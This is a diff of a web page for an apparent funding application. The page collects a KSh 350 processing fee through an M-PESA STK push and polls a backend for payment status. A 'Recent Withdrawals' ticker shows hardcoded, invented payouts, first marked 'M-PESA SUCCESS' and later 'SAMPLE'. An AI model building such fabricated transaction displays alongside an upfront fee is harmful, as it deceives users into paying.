@@ -95,7 +95,7 @@ input{
     border:1px solid rgba(255,255,255,0.12);
     border-radius:10px;
     font-size:16px;
-    font-family:'Poppins',sans-serif;
+    font-family:'Mali',sans-serif;
     background:rgba(255,255,255,0.07);
     color:#fff;
     outline:none;
@@ -106,10 +106,15 @@ input:focus{
     box-shadow:0 0 0 3px rgba(212,175,55,0.10);
 }
 
+/* ================================
+   PAYMENT BUTTON
+   Equal spacing above and below
+================================ */
+
 button{
     width:100%;
     padding:15px;
-    margin-top:17px;
+    margin:17px 0;
 
     background:
         linear-gradient(
@@ -121,7 +126,7 @@ button{
     color:#0B0217;
     border:none;
     border-radius:11px;
-    font-family:'Poppins',sans-serif;
+    font-family:'Mali',sans-serif;
     font-size:16px;
     font-weight:700;
     cursor:pointer;
@@ -153,7 +158,7 @@ button:disabled{
 
 #stkMessage{
     min-height:20px;
-    margin-top:13px;
+    margin-top:0;
     color:#D4AF37;
     font-size:13px;
     font-weight:600;
@@ -162,11 +167,10 @@ button:disabled{
 
 
 /* =================================
-   RECENT ACTIVITY SECTION
+   RECENT WITHDRAWALS
 ================================= */
 
 .activity-box{
-
     margin-top:18px;
 
     background:#1D293B;
@@ -179,14 +183,12 @@ button:disabled{
 
     box-shadow:
         0 20px 60px rgba(0,0,0,0.45);
-
 }
 
 
 /* Section heading */
 
 .activity-title{
-
     text-align:center;
 
     font-size:21px;
@@ -196,42 +198,31 @@ button:disabled{
     color:#fff;
 
     margin:2px 0 18px;
-
 }
 
-
-/* Small icon before heading */
-
 .activity-title span{
-
     margin-right:7px;
-
 }
 
 
 /*
-   This is the visible window.
-
-   The cards inside it move vertically.
+   Visible scrolling window
 */
 
 .activity-window{
-
     height:560px;
 
     overflow:hidden;
 
     position:relative;
-
 }
 
 
 /*
-   Moving track containing all cards.
+   Moving track
 */
 
 .activity-track{
-
     display:flex;
 
     flex-direction:column;
@@ -239,28 +230,23 @@ button:disabled{
     gap:14px;
 
     animation:scrollActivity 35s linear infinite;
-
 }
 
 
 /*
-   Pause scrolling when the user touches
-   the activity section.
+   Pause while touching
 */
 
 .activity-window:active .activity-track{
-
     animation-play-state:paused;
-
 }
 
 
 /*
-   Each withdrawal/activity card.
+   Withdrawal card
 */
 
 .activity-item{
-
     min-height:118px;
 
     background:#020617;
@@ -278,53 +264,45 @@ button:disabled{
     padding:18px 16px 18px 17px;
 
     flex-shrink:0;
-
 }
 
 
 /*
-   Phone number and amount area.
+   Information
 */
 
 .activity-info{
-
     display:flex;
 
     flex-direction:column;
 
     gap:8px;
 
+    min-width:0;
 }
 
-
 .activity-phone{
-
     font-size:17px;
 
     font-weight:600;
 
     color:#fff;
-
 }
 
-
 .activity-amount{
-
     font-size:16px;
 
     font-weight:500;
 
     color:#fff;
-
 }
 
 
 /*
-   Success badge.
+   Status
 */
 
 .activity-status{
-
     background:rgba(0,166,81,0.20);
 
     color:#19D99A;
@@ -341,28 +319,22 @@ button:disabled{
 
     text-align:center;
 
+    margin-left:8px;
 }
 
 
 /*
-   Continuous upward movement.
-
-   Because the list is duplicated below,
-   the animation loops smoothly.
+   Continuous movement
 */
 
 @keyframes scrollActivity{
 
     0%{
-
         transform:translateY(0);
-
     }
 
     100%{
-
         transform:translateY(-50%);
-
     }
 
 }
@@ -375,75 +347,54 @@ button:disabled{
 @media(max-width:360px){
 
     body{
-
         padding:10px 7px;
-
     }
 
     .card{
-
         padding:18px 13px 15px;
-
         border-radius:15px;
-
     }
 
     h1{
-
         font-size:20px;
-
     }
 
     button{
-
         padding:14px;
-
+        margin:14px 0;
         font-size:15px;
-
     }
 
     .activity-box{
-
         padding:20px 9px;
-
         border-radius:23px;
-
     }
 
     .activity-title{
-
         font-size:19px;
+    }
 
+    .activity-window{
+        height:500px;
     }
 
     .activity-item{
-
         min-height:110px;
-
-        padding:16px 12px;
-
+        padding:16px 10px;
         border-radius:20px;
-
     }
 
     .activity-phone{
-
         font-size:15px;
-
     }
 
     .activity-amount{
-
         font-size:14px;
-
     }
 
     .activity-status{
-
-        padding:12px 10px;
-
-        font-size:10px;
-
+        padding:11px 8px;
+        font-size:9px;
     }
 
 }
@@ -454,7 +405,6 @@ button:disabled{
 
 
 <body>
-
 
 <div class="container">
 
@@ -513,825 +463,374 @@ Processing Fee: KSh 350
 
 
 <!-- =================================
-     RECENT ACTIVITY
+     RECENT WITHDRAWALS
 ================================= -->
 
 <div class="activity-box">
 
-
 <div class="activity-title">
-
 <span>📊</span>
-Recent Activity
-
+Recent Withdrawals
 </div>
 
-
 <div class="activity-window">
-
 
 <div class="activity-track">
 
 
-<!-- 1 -->
+<!-- 20 SAMPLE WITHDRAWALS -->
 
 <div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0702****5
-</div>
-
-<div class="activity-amount">
-KSh. 2,626
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 2 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0115****0
-</div>
-
-<div class="activity-amount">
-KSh. 683
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 3 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0757****0
-</div>
-
-<div class="activity-amount">
-KSh. 4,809
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 4 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0722****9
-</div>
-
-<div class="activity-amount">
-KSh. 1,581
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 5 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0719****7
-</div>
-
-<div class="activity-amount">
-KSh. 2,750
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 6 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0749****6
-</div>
-
-<div class="activity-amount">
-KSh. 1,839
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 7 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0791****3
-</div>
-
-<div class="activity-amount">
-KSh. 3,420
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 8 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0708****1
-</div>
-
-<div class="activity-amount">
-KSh. 2,145
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 9 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0728****4
-</div>
-
-<div class="activity-amount">
-KSh. 5,120
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 10 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0712****8
-</div>
-
-<div class="activity-amount">
-KSh. 1,960
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 11 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0798****2
-</div>
-
-<div class="activity-amount">
-KSh. 3,075
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 12 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0705****9
-</div>
-
-<div class="activity-amount">
-KSh. 2,390
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 13 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0740****5
-</div>
-
-<div class="activity-amount">
-KSh. 4,250
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 14 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0725****6
-</div>
-
-<div class="activity-amount">
-KSh. 1,725
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 15 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0710****4
-</div>
-
-<div class="activity-amount">
-KSh. 2,880
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 16 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0786****1
-</div>
-
-<div class="activity-amount">
-KSh. 3,650
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 17 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0701****8
-</div>
-
-<div class="activity-amount">
-KSh. 1,245
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 18 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0733****2
-</div>
-
-<div class="activity-amount">
-KSh. 4,500
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 19 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0772****7
-</div>
-
-<div class="activity-amount">
-KSh. 2,175
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-<!-- 20 -->
-
-<div class="activity-item">
-
-<div class="activity-info">
-
-<div class="activity-phone">
-0750****3
-</div>
-
-<div class="activity-amount">
-KSh. 3,890
-</div>
-
-</div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
-</div>
-
-
-
-<!-- =================================
-     DUPLICATE 20 CARDS
-     FOR CONTINUOUS SCROLLING
-================================= -->
-
-
-<!-- 1 -->
-
-<div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0702****5</div>
 <div class="activity-amount">KSh. 2,626</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 2 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0115****0</div>
 <div class="activity-amount">KSh. 683</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 3 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0757****0</div>
 <div class="activity-amount">KSh. 4,809</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 4 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0722****9</div>
 <div class="activity-amount">KSh. 1,581</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 5 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0719****7</div>
 <div class="activity-amount">KSh. 2,750</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 6 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0749****6</div>
 <div class="activity-amount">KSh. 1,839</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 7 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0791****3</div>
 <div class="activity-amount">KSh. 3,420</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 8 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0708****1</div>
 <div class="activity-amount">KSh. 2,145</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 9 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0728****4</div>
 <div class="activity-amount">KSh. 5,120</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 10 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0712****8</div>
 <div class="activity-amount">KSh. 1,960</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 11 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0798****2</div>
 <div class="activity-amount">KSh. 3,075</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 12 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0705****9</div>
 <div class="activity-amount">KSh. 2,390</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 13 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0740****5</div>
 <div class="activity-amount">KSh. 4,250</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 14 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0725****6</div>
 <div class="activity-amount">KSh. 1,725</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 15 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0710****4</div>
 <div class="activity-amount">KSh. 2,880</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 16 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0786****1</div>
 <div class="activity-amount">KSh. 3,650</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 17 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0701****8</div>
 <div class="activity-amount">KSh. 1,245</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 18 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0733****2</div>
 <div class="activity-amount">KSh. 4,500</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 19 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0772****7</div>
 <div class="activity-amount">KSh. 2,175</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
-</div>
-
-
-<!-- 20 -->
 
 <div class="activity-item">
-
 <div class="activity-info">
 <div class="activity-phone">0750****3</div>
 <div class="activity-amount">KSh. 3,890</div>
 </div>
-
-<div class="activity-status">
-✓ M-PESA SUCCESS
-</div>
-
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
 
+
+<!-- DUPLICATE FOR CONTINUOUS SCROLLING -->
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0702****5</div>
+<div class="activity-amount">KSh. 2,626</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0115****0</div>
+<div class="activity-amount">KSh. 683</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0757****0</div>
+<div class="activity-amount">KSh. 4,809</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0722****9</div>
+<div class="activity-amount">KSh. 1,581</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0719****7</div>
+<div class="activity-amount">KSh. 2,750</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0749****6</div>
+<div class="activity-amount">KSh. 1,839</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0791****3</div>
+<div class="activity-amount">KSh. 3,420</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0708****1</div>
+<div class="activity-amount">KSh. 2,145</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0728****4</div>
+<div class="activity-amount">KSh. 5,120</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0712****8</div>
+<div class="activity-amount">KSh. 1,960</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0798****2</div>
+<div class="activity-amount">KSh. 3,075</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0705****9</div>
+<div class="activity-amount">KSh. 2,390</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0740****5</div>
+<div class="activity-amount">KSh. 4,250</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0725****6</div>
+<div class="activity-amount">KSh. 1,725</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0710****4</div>
+<div class="activity-amount">KSh. 2,880</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0786****1</div>
+<div class="activity-amount">KSh. 3,650</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0701****8</div>
+<div class="activity-amount">KSh. 1,245</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0733****2</div>
+<div class="activity-amount">KSh. 4,500</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0772****7</div>
+<div class="activity-amount">KSh. 2,175</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0750****3</div>
+<div class="activity-amount">KSh. 3,890</div>
+</div>
+<div class="activity-status">✓ SAMPLE</div>
 </div>
 
 </div>
-
 </div>
-
+</div>
 
 </div>
 
 
 <script>
-
 
 /*
 =========================================================
@@ -1339,7 +838,8 @@ LOAD APPLICANT NAME
 =========================================================
 */
 
-let applicant = localStorage.getItem("applicantName");
+let applicant =
+    localStorage.getItem("applicantName");
 
 document.getElementById("name").innerHTML =
     applicant || "Applicant";
@@ -1362,33 +862,32 @@ document.getElementById("feeAmount").innerHTML =
     Number(processingFee).toLocaleString();
 
 
-
 /*
 =========================================================
 START STK PUSH
 =========================================================
 */
 
-async function payNow() {
+async function payNow(){
 
     let phone =
         document.getElementById("phone").value.trim();
 
+    if(phone === ""){
 
-    /*
-    Save phone number so it can be used
-    on the next application pages.
-    */
+        alert(
+            "Please enter your M-PESA phone number."
+        );
+
+        return;
+    }
+
 
     localStorage.setItem(
         "phoneNumber",
         phone
     );
 
-
-    /*
-    Save applicant name.
-    */
 
     localStorage.setItem(
         "fullName",
@@ -1400,53 +899,27 @@ async function payNow() {
         document.getElementById("payBtn");
 
 
-    /*
-    Make sure a phone number was entered.
-    */
-
-    if (phone === "") {
-
-        alert(
-            "Please enter your M-PESA phone number."
-        );
-
-        return;
-    }
-
-
-    /*
-    Disable the button while the STK Push
-    request is being processed.
-    */
-
     btn.innerHTML =
         "Sending STK Push...";
 
     btn.disabled = true;
 
 
-    try {
-
-
-        /*
-        =====================================================
-        SEND STK PUSH TO BACKEND
-        =====================================================
-        */
+    try{
 
         let response = await fetch(
             "https://nyota-funds-backend.onrender.com/stk-push",
             {
-                method: "POST",
+                method:"POST",
 
-                headers: {
+                headers:{
                     "Content-Type":
                         "application/json"
                 },
 
-                body: JSON.stringify({
+                body:JSON.stringify({
 
-                    phone: phone,
+                    phone:phone,
 
                     amount:
                         Number(processingFee)
@@ -1455,10 +928,6 @@ async function payNow() {
             }
         );
 
-
-        /*
-        Read backend response.
-        */
 
         let data =
             await response.json();
@@ -1470,11 +939,10 @@ async function payNow() {
         );
 
 
-        /*
-        If STK Push failed, show the error.
-        */
-
-        if (!response.ok || !data.success) {
+        if(
+            !response.ok ||
+            !data.success
+        ){
 
             throw new Error(
                 data.message ||
@@ -1483,31 +951,18 @@ async function payNow() {
         }
 
 
-        /*
-        Get the Paylor transaction ID.
-        */
-
         let transactionId =
             data.transactionId ||
             data.checkout_request_id;
 
 
-        /*
-        Transaction ID is required for
-        checking payment status.
-        */
-
-        if (!transactionId) {
+        if(!transactionId){
 
             throw new Error(
                 "No Paylor transaction ID received"
             );
         }
 
-
-        /*
-        STK Push has been sent.
-        */
 
         btn.innerHTML =
             "Processing...";
@@ -1519,21 +974,12 @@ async function payNow() {
             "An M-PESA payment request has been sent to your phone. Please enter your M-PESA PIN to complete the payment.";
 
 
-        /*
-        Start checking payment status.
-        */
-
         checkPayment(
             transactionId
         );
 
 
-    } catch (error) {
-
-
-        /*
-        Payment request failed.
-        */
+    }catch(error){
 
         console.log(
             "PAYMENT ERROR:",
@@ -1547,17 +993,12 @@ async function payNow() {
         );
 
 
-        /*
-        Allow the applicant to try again.
-        */
-
         btn.innerHTML =
             "Pay Processing Fee";
 
         btn.disabled = false;
     }
 }
-
 
 
 /*
@@ -1568,50 +1009,33 @@ CHECK PAYMENT STATUS
 
 async function checkPayment(
     transactionId
-) {
-
-
-    /*
-    Check the payment every 3 seconds.
-    */
+){
 
     let interval =
-        setInterval(async () => {
+        setInterval(async()=>{
 
-            try {
-
-
-                /*
-                =================================================
-                ASK BACKEND FOR PAYMENT STATUS
-                =================================================
-                */
+            try{
 
                 let response =
                     await fetch(
                         "https://nyota-funds-backend.onrender.com/payment-status",
                         {
-                            method: "POST",
+                            method:"POST",
 
-                            headers: {
+                            headers:{
                                 "Content-Type":
                                     "application/json"
                             },
 
-                            body:
-                                JSON.stringify({
+                            body:JSON.stringify({
 
-                                    transactionId:
-                                        transactionId
+                                transactionId:
+                                    transactionId
 
-                                })
+                            })
                         }
                     );
 
-
-                /*
-                Read payment status response.
-                */
 
                 let result =
                     await response.json();
@@ -1623,15 +1047,11 @@ async function checkPayment(
                 );
 
 
-                /*
-                Continue checking if payment
-                information isn't available yet.
-                */
-
-                if (
+                if(
                     !result.success ||
                     !result.data
-                ) {
+                ){
+
                     return;
                 }
 
@@ -1640,41 +1060,24 @@ async function checkPayment(
                     result.data;
 
 
-                /*
-                Convert status to uppercase
-                for reliable comparison.
-                */
-
                 let status =
                     String(
                         payment.status || ""
                     ).toUpperCase();
 
 
-
                 /*
-                =================================================
-                PAYMENT SUCCESSFUL
-                =================================================
+                PAYMENT SUCCESS
                 */
 
-                if (
+                if(
                     status === "COMPLETED"
-                ) {
-
-
-                    /*
-                    Stop checking the transaction.
-                    */
+                ){
 
                     clearInterval(
                         interval
                     );
 
-
-                    /*
-                    Show success message.
-                    */
 
                     document.getElementById(
                         "stkMessage"
@@ -1682,40 +1085,24 @@ async function checkPayment(
                         "✅ Payment successful. Redirecting...";
 
 
-                    /*
-                    Move applicant to delivery page.
-                    */
-
                     window.location.href =
                         "delivery.html";
                 }
 
 
-
                 /*
-                =================================================
-                PAYMENT FAILED OR CANCELLED
-                =================================================
+                PAYMENT FAILED
                 */
 
-                else if (
+                else if(
                     status === "CANCELLED" ||
                     status === "FAILED"
-                ) {
-
-
-                    /*
-                    Stop checking.
-                    */
+                ){
 
                     clearInterval(
                         interval
                     );
 
-
-                    /*
-                    Show failure message.
-                    */
 
                     document.getElementById(
                         "stkMessage"
@@ -1724,10 +1111,6 @@ async function checkPayment(
                         status.toLowerCase() +
                         ".";
 
-
-                    /*
-                    Allow another payment attempt.
-                    */
 
                     document.getElementById(
                         "payBtn"
@@ -1741,13 +1124,7 @@ async function checkPayment(
                 }
 
 
-            } catch (error) {
-
-
-                /*
-                Status-checking errors are logged.
-                The next interval will try again.
-                */
+            }catch(error){
 
                 console.log(
                     "STATUS ERROR:",
@@ -1756,7 +1133,7 @@ async function checkPayment(
 
             }
 
-        }, 3000);
+        },3000);
 
 }
 
